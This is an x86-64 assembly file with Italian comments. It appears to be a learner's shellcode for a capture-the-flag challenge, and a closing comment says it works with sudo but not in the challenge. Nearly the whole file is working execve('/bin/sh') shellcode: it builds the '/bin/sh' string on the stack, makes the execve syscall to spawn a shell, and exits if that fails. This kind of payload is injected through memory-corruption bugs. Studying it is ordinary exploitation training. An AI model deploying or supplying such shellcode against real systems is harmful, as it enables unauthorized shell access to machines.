.intel_syntax noprefix
.global _start

.section .text
_start:
    # Scrive "/bin/sh" nello stack
    xor rax, rax              # Pulisce il registro RAX
    push rax                  # Aggiunge un terminatore NULL (necessario per la stringa C)
    mov rdi, 0x68732f6e69622f # Carica "/bin/sh" come valore esadecimale
    push rdi                  # Spinge "/bin/sh" sullo stack

    # Imposta i registri per la syscall execve
    mov rdi, rsp              # RDI punta a "/bin/sh" (argomento filename)
    xor rsi, rsi              # RSI = NULL (argomento argv[])
    xor rdx, rdx              # RDX = NULL (argomento envp[])
    mov rax, 59               # Numero della syscall SYS_execve (59 su x86_64)
    syscall                   # Invoca la syscall

    # Termina il programma se execve fallisce
    mov rax, 60               # Numero della syscall SYS_exit (60 su x86_64)
    syscall

#funziona con sudo ma non con la challenge
